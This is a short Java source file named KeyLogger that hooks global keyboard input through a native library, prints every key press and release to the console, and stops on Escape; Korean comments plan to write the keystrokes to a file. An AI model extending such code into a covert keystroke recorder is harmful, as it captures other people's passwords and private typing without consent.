import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

import java.util.Map;

public class KeyLogger {
    private static boolean run = true;
    private GlobalKeyboardHook keyboardHook;

    public KeyLogger() {
//        File 객체 open
//        버퍼? 버퍼쓸꺼면 죽기전에 버퍼에 있는거 File에 flush하고 close
        // Might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails
        keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of raw input

        System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown. Connected keyboards:");

        for (Map.Entry<Long, String> keyboard : GlobalKeyboardHook.listKeyboards().entrySet()) {
            System.out.format("%d: %s\n", keyboard.getKey(), keyboard.getValue());
        }

        keyboardHook.addKeyListener(new GlobalKeyAdapter() {

            @Override
            public void keyPressed(GlobalKeyEvent event) {
                System.out.println(event);
                if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
                    run = false;
                }
            }

            @Override
            public void keyReleased(GlobalKeyEvent event) {
                System.out.println(event);
            }
        });

        try {
            while (run) {
                Thread.sleep(128);
            }
        } catch (InterruptedException e) {
            //Do nothing
        } finally {
            keyboardHook.shutdownHook();
        }
    }

}
